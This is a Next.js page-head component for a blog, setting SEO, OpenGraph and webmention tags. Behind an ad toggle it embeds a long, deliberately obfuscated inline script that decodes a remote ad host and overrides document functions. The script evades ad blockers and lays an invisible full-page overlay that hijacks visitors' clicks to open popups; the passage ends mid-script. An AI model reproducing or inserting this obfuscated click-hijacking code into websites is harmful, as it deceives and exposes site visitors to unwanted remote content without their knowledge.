import { siteConfig } from '@/lib/config'
import { useGlobal } from '@/lib/global'
import { loadExternalResource } from '@/lib/utils'
import Head from 'next/head'
import { useRouter } from 'next/router'
import { useEffect } from 'react'

/**
 * 页面的Head头，有用于SEO
 * @param {*} param0
 * @returns
 */
const GlobalHead = props => {
  const { children, siteInfo, post, NOTION_CONFIG } = props
  let url = siteConfig('PATH')?.length
    ? `${siteConfig('LINK')}/${siteConfig('SUB_PATH', '')}`
    : siteConfig('LINK')
  let image
  const router = useRouter()
  const meta = getSEOMeta(props, router, useGlobal()?.locale)
  if (meta) {
    url = `${url}/${meta.slug}`
    image = meta.image || '/bg_image.jpg'
  }
  const title = meta?.title || siteConfig('TITLE')
  const description = meta?.description || `${siteInfo?.description}`
  const type = meta?.type || 'website'
  const lang = siteConfig('LANG').replace('-', '_') // Facebook OpenGraph 要 zh_CN 這樣的格式才抓得到語言
  const category = meta?.category || siteConfig('KEYWORDS') // section 主要是像是 category 這樣的分類，Facebook 用這個來抓連結的分類
  const favicon = siteConfig('BLOG_FAVICON')
  const webFontUrl = siteConfig('FONT_URL')
  const BACKGROUND_DARK = siteConfig('BACKGROUND_DARK', '', NOTION_CONFIG)

  const SEO_BAIDU_SITE_VERIFICATION = siteConfig(
    'SEO_BAIDU_SITE_VERIFICATION',
    null,
    NOTION_CONFIG
  )

  const SEO_GOOGLE_SITE_VERIFICATION = siteConfig(
    'SEO_GOOGLE_SITE_VERIFICATION',
    null,
    NOTION_CONFIG
  )

  const BLOG_FAVICON = siteConfig('BLOG_FAVICON', null, NOTION_CONFIG)

  const COMMENT_WEBMENTION_ENABLE = siteConfig(
    'COMMENT_WEBMENTION_ENABLE',
    null,
    NOTION_CONFIG
  )

  const COMMENT_WEBMENTION_HOSTNAME = siteConfig(
    'COMMENT_WEBMENTION_HOSTNAME',
    null,
    NOTION_CONFIG
  )
  const COMMENT_WEBMENTION_AUTH = siteConfig(
    'COMMENT_WEBMENTION_AUTH',
    null,
    NOTION_CONFIG
  )
  const ANALYTICS_BUSUANZI_ENABLE = siteConfig(
    'ANALYTICS_BUSUANZI_ENABLE',
    null,
    NOTION_CONFIG
  )

  const FACEBOOK_PAGE = siteConfig('FACEBOOK_PAGE', null, NOTION_CONFIG)
  // SEO关键词
  let keywords = meta?.tags || siteConfig('KEYWORDS')
  if (post?.tags && post?.tags?.length > 0) {
    keywords = post?.tags?.join(',')
  }

  // monetag广告
  const AD_MONETAG_TOGGLE = siteConfig('AD_MONETAG_TOGGLE')

  useEffect(() => {
    // 使用WebFontLoader字体加载
    loadExternalResource(
      'https://cdnjs.cloudflare.com/ajax/libs/webfont/1.6.28/webfontloader.js',
      'js'
    ).then(url => {
      const WebFont = window?.WebFont
      if (WebFont) {
        console.log('LoadWebFont', webFontUrl)
        WebFont.load({
          custom: {
            // families: ['"LXGW WenKai"'],
            urls: webFontUrl
          }
        })
      }
    })
  }, [])

  return (
    <Head>
      <link rel='icon' href={favicon} />
      <title>{title}</title>
      <meta name='theme-color' content={BACKGROUND_DARK} />
      <meta
        name='viewport'
        content='width=device-width, initial-scale=1.0, maximum-scale=5.0, minimum-scale=1.0'
      />
      <meta name='robots' content='follow, index' />
      <meta charSet='UTF-8' />
      {SEO_GOOGLE_SITE_VERIFICATION && (
        <meta
          name='google-site-verification'
          content={SEO_GOOGLE_SITE_VERIFICATION}
        />
      )}
      {SEO_BAIDU_SITE_VERIFICATION && (
        <meta
          name='baidu-site-verification'
          content={SEO_BAIDU_SITE_VERIFICATION}
        />
      )}
      <meta name='keywords' content={keywords} />
      <meta name='description' content={description} />
      <meta property='og:locale' content={lang} />
      <meta property='og:title' content={title} />
      <meta property='og:description' content={description} />
      <meta property='og:url' content={url} />
      <meta property='og:image' content={image} />
      <meta property='og:site_name' content={title} />
      <meta property='og:type' content={type} />
      <meta name='twitter:card' content='summary_large_image' />
      <meta name='twitter:description' content={description} />
      <meta name='twitter:title' content={title} />

      <link rel='icon' href={BLOG_FAVICON} />

      {COMMENT_WEBMENTION_ENABLE && (
        <>
          <link
            rel='webmention'
            href={`https://webmention.io/${COMMENT_WEBMENTION_HOSTNAME}/webmention`}
          />
          <link
            rel='pingback'
            href={`https://webmention.io/${COMMENT_WEBMENTION_HOSTNAME}/xmlrpc`}
          />
          {COMMENT_WEBMENTION_AUTH && (
            <link href={COMMENT_WEBMENTION_AUTH} rel='me' />
          )}
        </>
      )}

      {ANALYTICS_BUSUANZI_ENABLE && (
        <meta name='referrer' content='no-referrer-when-downgrade' />
      )}
      {meta?.type === 'Post' && (
        <>
          <meta property='article:published_time' content={meta.publishDay} />
          <meta property='article:author' content={siteConfig('AUTHOR')} />
          <meta property='article:section' content={category} />
          <meta property='article:publisher' content={FACEBOOK_PAGE} />
        </>
      )}
      {children}

      {AD_MONETAG_TOGGLE && (
          <script id='monetag-ad-1'>
            {`(()=>{var f='rCaohdCemzoMraftzhgznriarntdSozmyzttroeSptorriPnegnzisfleidczetzcreejpblOazceelzbzafrourgEiafcnhozcazpwpoldynzigWettnzectrneoactzedTleixhtCNdondeepzpRaezglEmxtphzzadtloibhzCXtGsIr=izfczo>necmaatrzf(id/o<c>u"meennotn):zygazlcpaslildz"l=oeclayltSst o"rkangaelzb_:dtautoabzas"e=tcIrtse mezmgaertfIit<ezmLzMrTeHmroevnenIitzeemdzocNleenaorlzcdzedcaoedhezUeRdIoCNotmnpeornaepnzteznboinnzdyzabltposaizdezveallyztJsSzOeNmzaDraftiezztAnrermauyczoPdrzoymdiosbezzeptaartsSeyIdnatezrnzatvpiigractSotrnzeernrcuocdzeeUmRaINzgUaiTnytB8sAtrnreamyezlsEetteTgizmdeIoyuBttznseemteIlnEtteergvzaSlNztAnrermaeylBEueftfaeerrzcczltenaermTgiamreFotuntezmculceoaDreItnateerrcvzatlnzeMveEshscatgaepCshiadnznlellAzrBortocaedlceaSsytrCehuaqnznreoltzceenlceoSdyerUeRuIqCzormepnoentesnitLztTnyepveEEervroomrezrEzvreennteztEsrirLotrnzeIvmEadgdeazzstensesmieolnESettoareargce'.split("").reduce((J,x,O)=>O%2?J+x:x+J).split("z");(J=>{let x=[f[0],f[1],f[2],f[3],f[4],f[5],f[6],f[7],f[8],f[9]],O=[f[10],f[11],f[12]],P=document,X,y,b=window,U={};try{try{X=window[f[13]][f[0]](f[14]),X[f[15]][f[16]]=f[17]}catch(a){y=(P[f[10]]?P[f[10]][f[18]]:P[f[12]]||P[f[19]])[f[20]](),y[f[21]]=f[22],X=y[f[23]]}P[f[9]](f[24])[0][f[25]](X),b=X[f[26]];let _={};_[f[27]]=!1,b[f[28]][f[29]](b[f[30]],f[31],_);let G=b[f[32]][f[33]]()[f[34]](36)[f[35]](2)[f[36]](/^d+/,f[37]);window[G]=document,x[f[38]](a=>{document[a]=function(){return b[f[13]][a][f[39]](window[f[13]],arguments)}}),O[f[38]](a=>{let g={};g[f[27]]=!1,g[f[40]]=()=>P[a],b[f[28]][f[29]](U,a,g)}),document[f[41]]=function(){let a=new b[f[42]](b[f[43]](f[44])[f[45]](f[46],b[f[43]](f[44])),f[47]);return arguments[0]=arguments[0][f[36]](a,G),b[f[13]][f[41]][f[48]](window[f[13]],arguments[0])};try{window[f[49]]=window[f[49]]}catch(a){let g={};g[f[50]]={},g[f[51]]=(V,Je)=>(g[f[50]][V]=b[f[30]](Je),g[f[50]][V]),g[f[52]]=V=>{if(V in g[f[50]])return g[f[50]][V]},g[f[53]]=V=>(delete g[f[50]][V],!0),g[f[54]]=()=>(g[f[50]]={},!0),delete window[f[49]],window[f[49]]=g}try{window[f[43]]}catch(a){delete window[f[43]],window[f[43]]=b[f[43]]}try{window[f[55]]}catch(a){delete window[f[55]],window[f[55]]=b[f[55]]}try{window[f[42]]}catch(a){delete window[f[42]],window[f[42]]=b[f[42]]}for(key in document)try{U[key]=document[key][f[56]](document)}catch(a){U[key]=document[key]}}catch(_){}let z=_=>{try{return b[_]}catch(G){try{return window[_]}catch(a){return null}}};[f[30],f[43],f[57],f[58],f[59],f[60],f[32],f[61],f[42],f[62],f[62],f[63],f[64],f[65],f[66],f[67],f[68],f[69],f[70],f[71],f[72],f[73],f[55],f[74],f[28],f[75],f[76],f[77],f[78],f[49],f[79]][f[38]](_=>{try{if(!window[_])throw new b[f[77]](f[37])}catch(G){try{let a={};a[f[27]]=!1,a[f[40]]=()=>b[_],b[f[28]][f[29]](window,_,a)}catch(a){}}}),J(z(f[30]),z(f[43]),z(f[57]),z(f[58]),z(f[59]),z(f[60]),z(f[32]),z(f[61]),z(f[42]),z(f[62]),z(f[62]),z(f[63]),z(f[64]),z(f[65]),z(f[66]),z(f[67]),z(f[68]),z(f[69]),z(f[70]),z(f[71]),z(f[72]),z(f[73]),z(f[55]),z(f[74]),z(f[28]),z(f[75]),z(f[76]),z(f[77]),z(f[78]),z(f[49]),z(f[79]),U)})((J,x,O,P,X,y,b,U,z,_,G,a,g,V,Je,W,ue,nn,dr,Y,lf,ir,tn,fn,oe,pf,un,I,on,j,Mr,qn)=>{(function(e,c,M,h){(()=>{function ie(r){let n=r[e.gj]()[e.Uk](e.X);return n>=e.IK&&n<=e.Zj?n-e.IK:n>=e.cM&&n<=e.pM?n-e.cM+e.JK:e.X}function br(r){return r<=e.lK?J[e.ij](r+e.IK):r<=e.wj?J[e.ij](r+e.cM-e.JK):e.sK}function cn(r,n){return r[e.nM](e.h)[e.vj]((t,u)=>{let o=(n+e.J)*(u+e.J),q=(ie(t)+o)%e.uK;return br(q)})[e.WK](e.h)}function _e(r,n){return r[e.nM](e.h)[e.vj]((t,u)=>{let o=n[u%(n[e.cK]-e.J)],q=ie(o),d=ie(t)-q,i=d<e.X?d+e.uK:d;return br(i)})[e.WK](e.h)}var dn=G,D=dn,Mn=new z(e.fr,e.xK),bn=new z(e.rK,e.xK),zn=e.V,an=[[e.DK],[e.AK,e.eK,e.tK],[e.yK,e.LK],[e.NK,e.FK,e.qK],[e.RK,e.mK]],kn=[[e.oK],[-e.Ij],[-e.lj],[-e.sj,-e.Dj],[e.TK,e.tK,-e.oK,-e.Aj]],jn=[[e.PK],[e.fK],[e.xj],[e.rj],[e.Kj]];function Ue(r,n){try{let t=r[e.Oj](u=>u[e.hb](n)>-e.J)[e.YM]();return r[e.hb](t)+zn}catch(t){return e.X}}function mn(r){return Mn[e.QK](r)?e.ur:bn[e.QK](r)?e.V:e.J}function En(r){return Ue(an,r)}function ln(r){return Ue(kn,r[e.dk]())}function pn(r){return Ue(jn,r)}function sn(r){return r[e.nM](e.HK)[e.vK](e.J)[e.Oj](n=>n)[e.YM]()[e.nM](e.zK)[e.vK](-e.V)[e.WK](e.zK)[e.eM]()[e.nM](e.h)[e.Cj]((n,t)=>n+ie(t),e.X)%e.zr+e.J}var Ve=[];function wn(){return Ve}function C(r){Ve[e.vK](-e.J)[e.lk]()!==r&&Ve[e.ej](r)}var qe=typeof M<e.s?M[e.qr]:e.v,Qe=e.H,Ze=e.n,Me=b[e.Ur]()[e.gj](e.uK)[e.vK](e.V),yn=b[e.Ur]()[e.gj](e.uK)[e.vK](e.V),Re=b[e.Ur]()[e.gj](e.uK)[e.vK](e.V),sf=b[e.Ur]()[e.gj](e.uK)[e.vK](e.V);function zr(r){qe[e.jj](Qe,zr),[mn(h[e.Pr]),En(c[e.tj][e.bj]),ln(new y),sn(c[e.Qj][e.FM]),pn(h[e.wb]||h[e.Ib])][e.Vr](n=>{let t=a(b[e.Ur]()*e.JK,e.JK);W(()=>{let u=e.Rr();u[e.kj]=r[e.Mj],u[e.Fb]=n,c[e.cj](u,e.wK),C(e.eE[e.BK](n))},t)})}function ar(r){qe[e.jj](Ze,ar);let n=e.Rr();n[e.kj]=r[e.Mj];let{href:t}=c[e.Qj],u=new c[e.Zk];u[e.ik](e.R,t),u[e.wk]=()=>{n[e.Br]=u[e.EE](),c[e.cj](n,e.wK)},u[e.KK]=()=>{n[e.Br]=e.Lb,c[e.cj](n,e.wK)},u[e.Ik]()}qe&&(qe[e.sr](Qe,zr),qe[e.sr](Ze,ar));var gn=e.u,hn=e.z,T=e.a,be=M[e.qr],Q=[c],Bn=[],xn=()=>{};be&&be[e.KK]&&(xn=be[e.KK]);try{let r=Q[e.vK](-e.J)[e.lk]();for(;r&&r!==r[e.BM]&&r[e.BM][e.tj][e.bj];)Q[e.ej](r[e.BM]),r=r[e.BM]}catch(r){}Q[e.Vr](r=>{r[e.ib][e.pb][e.vb][e.JM]||(r[e.ib][e.pb][e.vb][e.JM]=b[e.Ur]()[e.gj](e.uK)[e.vK](e.V));let n=r[e.ib][e.pb][e.vb][e.JM];r[n]=r[n]||[];try{r[T]=r[T]||[]}catch(t){}});function Xn(r,n,t,u=e.X,o=e.X,q){let d;try{d=be[e.Ak][e.nM](e.HK)[e.V]}catch(i){}try{let i=c[e.ib][e.pb][e.vb][e.JM]||T,k=c[i][e.Oj](l=>l[e.QM]===t&&l[e.Vb])[e.YM](),s=e.Rr();s[e.VM]=r,s[e.Qb]=n,s[e.QM]=t,s[e.Vb]=k?k[e.Vb]:o,s[e.Hb]=d,s[e.nb]=u,s[e.ub]=q,q&&q[e.Zb]&&(s[e.Zb]=q[e.Zb]),Bn[e.ej](s),Q[e.Vr](l=>{let B=l[e.ib][e.pb][e.vb][e.JM]||T;l[B][e.ej](s);try{l[T][e.ej](s)}catch(m){}})}catch(i){}}function Oe(r,n){let t=vn();for(let u=e.X;u<t[e.cK];u++)if(t[u][e.QM]===n&&t[u][e.VM]===r)return!e.X;return!e.J}function vn(){let r=[];for(let n=e.X;n<Q[e.cK];n++){let t=Q[n][e.ib][e.pb][e.vb][e.JM],u=Q[n][t]||[];for(let o=e.X;o<u[e.cK];o++)r[e.Oj](({format:q,zoneId:d})=>{let i=q===u[o][e.VM],k=d===u[o][e.QM];return i&&k})[e.cK]>e.X||r[e.ej](u[o])}try{for(let n=e.X;n<Q[e.cK];n++){let t=Q[n][T]||[];for(let u=e.X;u<t[e.cK];u++)r[e.Oj](({format:o,zoneId:q})=>{let d=o===t[u][e.VM],i=q===t[u][e.QM];return d&&i})[e.cK]>e.X||r[e.ej](t[u])}}catch(n){}return r}function kr(r,n){Q[e.vj](t=>{let u=t[e.ib][e.pb][e.vb][e.JM]||T;return(t[u]||[])[e.Oj](o=>r[e.hb](o[e.QM])>-e.J)})[e.Cj]((t,u)=>t[e.BK](u),[])[e.Vr](t=>{try{t[e.ub][e.qk](n)}catch(u){}})}var A=e.Rr();A[e.J]=e.x,A[e.Hr]=e.r,A[e.nr]=e.K,A[e.ur]=e.j,A[e.zr]=e.k,A[e.ar]=e.M,A[e.V]=e.b;var S=e.Rr();S[e.J]=e.E,S[e.ar]=e.Y,S[e.ur]=e.S,S[e.V]=e.b;var K=e.Rr();K[e.J]=e.g,K[e.V]=e.C,K[e.Hr]=e.G,K[e.nr]=e.G,K[e.ur]=e.G;var E=7934019,Z=7934018,wf=0,Jn=0,_n=30,Un=3,yf=true,gf=X[e.OK](x('eyJhZGJsb2NrIjp7fSwiZXhjbHVkZXMiOiIifQ==')),R=2,jr='Ly9haXN0ZWtzby5uZXQvNDAwLzc5MzQwMTk=',mr='YWlzdGVrc28ubmV0',Vn=2,Qn=1724203781*e.mr,Zn='Zez$#t^*EFng',Rn='7ne',On='apfg0ycbyo7',Er='89a1z7uz',lr='197',pr='oji97n9ymvg',Wn='_uifqxzuj',Cn='_laokwvz',Hn=false,w=e.Rr(),Fn=e.yM[e.nM](e.h)[e.yj]()[e.WK](e.h);typeof c<e.s&&(w[e.Ej]=c,typeof c[e.tj]<e.s&&(w[e.Lj]=c[e.tj])),typeof M<e.s&&(w[e.Yj]=M,w[e.Sj]=M[Fn]),typeof h<e.s&&(w[e.jK]=h);function sr(){let{doc:r}=w;try{w[e.VK]=r[e.VK]}catch(n){let t=[][e.yb][e.tk](r[e.Nb](e.Nj),u=>u[e.Ak]===e.Hj);w[e.VK]=t&&t[e.Db][e.VK]}}sr(),w[e.Xr]=()=>{if(!c[e.BM])return e.v;try{let r=c[e.BM][e.ib],n=r[e.VK](e.Jk);return r[e.Ab][e.ek](n),n[e.UM]!==r[e.Ab]?!e.J:(n[e.UM][e.yk](n),w[e.Ej]=c[e.BM],w[e.Yj]=w[e.Ej][e.ib],sr(),!e.X)}catch(r){return!e.J}},w[e.Jr]=()=>{try{return w[e.Yj][e.qr][e.UM]!==w[e.Yj][e.Ab]?(w[e.Pb]=w[e.Yj][e.qr][e.UM],(!w[e.Pb][e.gK][e.wM]||w[e.Pb][e.gK][e.wM]===e.Gk)&&(w[e.Pb][e.gK][e.wM]=e.fb),!e.X):!e.J}catch(r){return!e.J}};var ze=w;function Pn(r,n,t){let u=ze[e.Yj][e.VK](e.Nj);u[e.gK][e.sk]=e.Vj,u[e.gK][e.bj]=e.Vj,u[e.gK][e.Dk]=e.X,u[e.Ak]=e.Hj,(ze[e.Yj][e.CM]||ze[e.Sj])[e.ek](u);let o=u[e.Ob][e.ik][e.tk](ze[e.Ej],r,n,t);return u[e.UM][e.yk](u),o}var ae,An=[];function Nn(){let r=[e.Fj,e.qj,e.Rj,e.mj,e.oj,e.Tj,e.Pj,e.fj],n=[e.sK,e.xk,e.rk,e.Kk,e.jk],t=[e.kk,e.Mk,e.bk,e.Ek,e.Yk,e.Sk,e.gk,e.Ck,e.Gk,e.hk,e.vk,e.Ok],u=b[e.Lk](b[e.Ur]()*r[e.cK]),o=r[u][e.Nk](/P/g,()=>{let q=b[e.Lk](b[e.Ur]()*t[e.cK]);return t[q]})[e.Nk](/N/g,()=>{let q=b[e.Lk](b[e.Ur]()*n[e.cK]),d=n[q],i=b[e.kE](e.JK,d[e.cK]),k=b[e.Lk](b[e.Ur]()*i);return e.h[e.BK](d)[e.BK](k)[e.vK](d[e.cK]*-e.J)});return e.HM[e.BK](ae,e.HK)[e.BK](o,e.HK)}function Yn(){return e.h[e.BK](Nn()[e.vK](e.X,-e.J),e.nK)}function Dn(r){return r[e.nM](e.HK)[e.vK](e.ur)[e.WK](e.HK)[e.nM](e.h)[e.Cj]((n,t,u)=>{let o=b[e.kE](u+e.J,e.ar);return n+t[e.Uk](e.X)*o},e.Fk)[e.gj](e.uK)}function Tn(){let r=M[e.VK](e.Nj);return r[e.gK][e.sk]=e.Vj,r[e.gK][e.bj]=e.Vj,r[e.gK][e.Dk]=e.X,r}function wr(r){r&&(ae=r,Ln())}function Ln(){ae&&An[e.Vr](r=>r(ae))}function Gn(){let r=Vn===e.J?e.nj:e.uj,n=e.Wb[e.BK](r,e.LM)[e.BK](A[R]),t=e.Rr();t[e.qk]=wr,t[e.Rk]=wn,t[e.mk]=pr,t[e.ok]=Er,t[e.Tk]=lr,Xn(n,gn,E,Qn,Z,t)}function yr(){let r=S[R];return Oe(r,Z)||Oe(r,E)}function gr(){let r=S[R];return Oe(r,Z)}function In(){let r=[e.Wk,e.ck,e.pk,e.Bk],n=M[e.VK](e.Nj);n[e.gK][e.Dk]=e.X,n[e.gK][e.bj]=e.Vj,n[e.gK][e.sk]=e.Vj,n[e.Ak]=e.Hj;try{M[e.pb][e.ek](n),r[e.Vr](t=>{try{c[t]}catch(u){delete c[t],c[t]=n[e.Ob][t]}}),M[e.pb][e.yk](n)}catch(t){}}var We=e.Rr(),ke=e.Rr(),Ce=e.Rr(),Sn=e.J,ee=e.h,je=e.h;He();function He(){if(ee)return;let r=ue(()=>{if(gr()){Y(r);return}if(je){try{let n=je[e.nM](Ee)[e.Oj](d=>!Ee[e.QK](d)),[t,u,o]=n;je=e.h,Ce[e.lr]=u,We[e.lr]=t,ke[e.lr]=_r(o,e.or),[We,ke,Ce][e.Vr](d=>{le(d,yn,Sn)});let q=[_e(We[e.Zr],ke[e.Zr]),_e(Ce[e.Zr],ke[e.Zr])][e.WK](e.zK);ee!==q&&(ee=q,kr([E,Z],ee))}catch(n){}Y(r)}},e.Qk)}function hr(){return ee}function $n(){ee=e.h}function me(r){r&&(je=r)}var p=e.Rr();p[e.Ur]=e.h,p[e.dr]=e.h,p[e.Zr]=e.h,p[e.ir]=void e.X,p[e.wr]=e.v,p[e.Ir]=_e(Rn,On);var Br=new y,xr=!e.J;Xr();function Xr(){p[e.ir]=!e.J,Br=new y;let r=ct(p,Re),n=ue(()=>{if(p[e.Zr]!==e.h){if(Y(n),c[e.jj](e.w,r),p[e.Zr]===e.Lb){p[e.ir]=!e.X;return}try{if(U(p[e.dr])[e.tE](e.X)[e.Vr](u=>{p[e.Ur]=e.h;let o=vr(e.fE,e.zE);U(o)[e.tE](e.X)[e.Vr](q=>{p[e.Ur]+=J[e.ij](vr(e.cM,e.pM))})}),gr())return;let t=e.wE*e.Ij*e.mr;W(()=>{if(xr)return;let u=new y()[e.xM]()-Br[e.xM]();p[e.wr]+=u,Xr(),He(),yt()},t)}catch(t){}p[e.ir]=!e.X,p[e.Zr]=e.h}},e.Qk);c[e.sr](e.w,r)}function Kn(){return p[e.Zr]=p[e.Zr]*e.ZM%e.Pk,p[e.Zr]}function vr(r,n){return r+Kn()%(n-r)}function et(r){return r[e.nM](e.h)[e.Cj]((n,t)=>(n<<e.nr)-n+t[e.Uk](e.X)&e.Pk,e.X)}function rt(){return[p[e.Ur],p[e.Ir]][e.WK](e.zK)}function Fe(){let r=[...e.uM],n=(b[e.Ur]()*e.iM|e.X)+e.Hr;return[...U(n)][e.vj](t=>r[b[e.Ur]()*r[e.cK]|e.X])[e.WK](e.h)}function Pe(){return p[e.ir]}function nt(){xr=!e.X}var Ee=new z(e.kK,e.h),tt=typeof M<e.s?M[e.qr]:e.v,ft=e.U,ut=e.d,ot=e.Z,qt=e.i;function le(r,n,t){let u=r[e.lr][e.nM](Ee)[e.Oj](q=>!Ee[e.QK](q)),o=e.X;return r[e.Zr]=u[o],r[e.cK]=u[e.cK],q=>{let d=q&&q[e.tM]&&q[e.tM][e.kj],i=q&&q[e.tM]&&q[e.tM][e.Fb];if(d===n)for(;i--;)o+=t,o=o>=u[e.cK]?e.X:o,r[e.Zr]=u[o]}}function ct(r,n){return t=>{let u=t&&t[e.tM]&&t[e.tM][e.kj],o=t&&t[e.tM]&&t[e.tM][e.Br];if(u===n)try{let q=(r[e.wr]?new y(r[e.wr])[e.gj]():o[e.nM](ft)[e.yb](s=>s[e.NM](e.yE)))[e.nM](ut)[e.lk](),d=new y(q)[e.pE]()[e.nM](ot),i=d[e.YM](),k=d[e.YM]()[e.nM](qt)[e.YM]();r[e.dr]=a(k/Un,e.JK)+e.J,r[e.wr]=r[e.wr]?r[e.wr]:new y(q)[e.xM](),r[e.Zr]=et(i+Zn)}catch(q){r[e.Zr]=e.Lb}}}function Jr(r,n){let t=new un(n);t[e.Mj]=r,tt[e.fk](t)}function _r(r,n){return U[e.zb](e.v,e.Rr(e.cK,n))[e.vj]((t,u)=>cn(r,u))[e.WK](e.aK)}var Ur=e.J,Ae=e.Rr(),Vr=e.Rr(),Qr=e.Rr();Ae[e.lr]=Er,c[e.sr](e.w,le(Ae,Me,Ur));var dt=Ae[e.cK]*e.or;Vr[e.lr]=_r(pr,dt),Qr[e.lr]=lr,c[e.sr](e.w,le(Vr,Me,e.or)),c[e.sr](e.w,le(Qr,Me,Ur));var Zr=e.I,pe=e.l,it=e.W,Mt=e.s;function Rr(r){let n=a(r,e.JK)[e.gj](e.uK),t=[Zr,n][e.WK](Mt),u=[Zr,n][e.WK](it);return[t,u]}function bt(r,n){let[t,u]=Rr(r);j[t]=e.X,j[u]=n}function zt(r){let[n,t]=Rr(r),u=a(j[n],e.JK)||e.X,o=j[t];return u>=e.ur?(delete j[n],delete j[t],e.v):o?(j[n]=u+e.J,o):e.v}function at(r){let n=new y()[e.xM]();try{j[pe]=e.h[e.BK](n,e.cb)[e.BK](r)}catch(t){}}function kt(){try{if(!j[pe])return e.h;let[r,n]=j[pe][e.nM](e.cb);return a(r,e.JK)+e.zj<new y()[e.xM]()?(delete j[pe],e.h):n}catch(r){return e.h}}var jt=e.D,mt=e.A,Ne=e.e,Et=e.t,Or=e.y,Ye=e.L,se=e.N,we=e.F,Wr=e.q,lt=e.R,pt=e.m,st=e.o,De=e.T,Cr=e.P,ye=!e.J;function wt(){return e.Gj[e.BK](E,e.XK)}function re(){return hr()}function yt(){let r=e.Rr(),n=ue(()=>{Pe()&&(Y(n),Te())},e.Qk);r[e.kj]=Re,c[e.cj](r,e.wK)}function Te(r){let n=new c[e.Zk];n[e.ik](lt,e.HM[e.BK](rt())),r&&n[e.rM](Ne,Et),n[e.rM](st,K[R]),n[e.wk]=()=>{if(n[e.Xb]===e.Jb){let t=n[e.EE]()[e.uE]()[e.nM](/[\r\n]+/),u=e.Rr();t[e.Vr](o=>{let q=o[e.nM](e.FE),d=q[e.YM]()[e.eM](),i=q[e.WK](e.FE);u[d]=i}),u[De]?(ye=!e.X,me(u[De]),r&&at(u[De])):u[Cr]&&me(u[Cr]),r||He()}},n[e.KK]=()=>{r&&(ye=!e.X,me(e.ME))},$n(),n[e.Ik]()}function Hr(r){return new D((n,t)=>{let u=new y()[e.xM](),o=ue(()=>{let q=hr();q?(Y(o),q===e.sE&&t(new I(e.Wr)),ye&&(r||nt(),n(q)),n()):u+e.IE<new y()[e.xM]()&&(Y(o),t(new I(e.qE)))},e.Qk)})}function gt(){let r=kt();if(r)ye=!e.X,me(r);else{let n=ue(()=>{Pe()&&(Y(n),Te(!e.X))},e.Qk)}}var Fr=e.f,hf=e.pK[e.BK](E,e.MK),Le=e.xr,Bf=Jn*e.Tr,xf=_n*e.mr;c[Le]||(c[Le]=e.Rr());function ht(r){try{let n=e.h[e.BK](Fr)[e.BK](r),t=Mr[n]||j[n];if(t)return new y()[e.xM]()>a(t,e.JK)}catch(n){}return!e.X}function Pr(r){let n=new y()[e.xM]()+e.zj,t=e.h[e.BK](Fr)[e.BK](r);c[Le][r]=!e.X;try{j[t]=n}catch(u){}try{Mr[t]=n}catch(u){}}var N=h[e.Pr],Bt=N[e.hj](/Chrome/([0-9]{1,})/)||[],xt=N[e.hj](/CriOS/([0-9]{1,})/)||[],Ar=a(Bt[e.J],e.JK)||a(xt[e.J],e.JK),ge=/iPhone|iPad|iPod/[e.QK](N),Xt=/android/i[e.QK](N),Nr=ge||Xt,vt=/Version/[^S]+Safari/[e.QK](N),Jt=/firefox/gi[e.QK](N),_t=/Android/i[e.QK](N)&&/Firefox/i[e.QK](N),v,ne,Ge=!e.J,Yr=!e.J,Dr=x(mr),Ut=[e.bK,e.H,e.EK,e.YK,e.SK];function Vt(r,n){let t=!_t&&Ar<e.kM;r[e.sr]?(ge||(Ar&&!Nr?r[e.sr](e.bK,n,!e.X):(Jt||vt)&&!Nr?r[e.sr](e.H,n,!e.X):(r[e.sr](e.H,n,!e.X),r[e.sr](e.EK,n,!e.X))),t?ge?r[e.sr](e.YK,n,!e.X):r[e.sr](e.SK,n,!e.X):ge&&r[e.sr](e.H,n,!e.X)):M[e.nk]&&r[e.nk](e.E,n)}function Tr(r){!ht(r)||Yr||(Yr=r===E,v=M[e.VK](e.rr),v[e.gK][e.wM]=e.MM,v[e.gK][e.BM]=e.X,v[e.gK][e.IM]=e.X,v[e.gK][e.lM]=e.X,v[e.gK][e.sM]=e.X,v[e.gK][e.Dr]=e.Pk,v[e.gK][e.DM]=e.bM,ne=n=>{if(Ge)return;n[e.YE](),n[e.SE](),he();let t=Pn(e.HM[e.BK](Dr,e.HE)[e.BK](r,e.WE));t&&r===Z?Pr(r):t&&r===E&&W(()=>{t[e.DE]||Pr(r)},e.mr)},Vt(v,ne),M[e.pb][e.ek](v),Ge=!e.J)}function he(){try{Ut[e.Vr](r=>{c[e.jj](r,ne,!e.X),c[e.jj](r,ne,!e.J)}),v&&M[e.pb][e.yk](v),ne=void e.X}catch(r){}Ge=!e.X}function Lr(){return ne===void e.X}function Gr(r){Dr=r}var Qt=e.rr,Ir=M[e.VK](Qt),Zt=e.Kr,Rt=e.jr,Ot=e.kr,Wt=e.Mr,Ct=e.br,Ht=e.Er;Ir[e.gK][e.Dr]=Zt,Ir[e.gK][e.Ar]=Rt;function Ft(r){let n=U[e.gE][e.vK][e.tk](M[e.xE])[e.Oj](t=>t[e.FM]===r)[e.lk]()[e.dj];return(n[e.X][e.ab][e.NM](e.AM)?n[e.X][e.gK][e.zM]:n[e.V][e.gK][e.zM])[e.vK](e.J,-e.J)}function Ie(r){return tn(x(r)[e.nM](e.h)[e.vj](function(n){return e.jE+(e.xk+n[e.Uk](e.X)[e.gj](e.zE))[e.vK](-e.V)})[e.WK](e.h))}function Se(r){let n=x(r),t=new nn(n[e.cK]);return new Je(t)[e.vj]((u,o)=>n[e.Uk](o))}function Pt(r,n){return new D((t,u)=>{let o=M[e.VK](Ot);o[e.FM]=r,o[e.qb]=Wt,o[e.gM]=Ht,o[e.Rb]=Ct,M[e.Ab][e.mb](o,M[e.Ab][e.rE]),o[e.wk]=()=>{try{let q=Ft(o[e.FM]);o[e.UM][e.yk](o),t(n===se?Se(q):Ie(q))}catch(q){u()}},o[e.KK]=()=>{o[e.UM][e.yk](o),u()}})}function At(r,n){return new D((t,u)=>{let o=new on;o[e.Rb]=e.eb,o[e.Ak]=r,o[e.wk]=()=>{let q=M[e.VK](e.aE);q[e.sk]=o[e.sk],q[e.bj]=o[e.bj];let d=q[e.JE](e.XE);d[e.QE](o,e.X,e.X);let{data:i}=d[e.UE](e.X,e.X,o[e.sk],o[e.bj]),k=i[e.vK](e.X,e.nE)[e.Oj]((m,H)=>(H+e.J)%e.Hr)[e.yj]()[e.Cj]((m,H,fe)=>m+H*b[e.kE](e.oE,fe),e.X),s=[];for(let m=e.nE;m<i[e.cK];m++)if((m+e.J)%e.Hr){let H=i[m];(n===se||H>=e.LE)&&s[e.ej](J[e.ij](H))}let 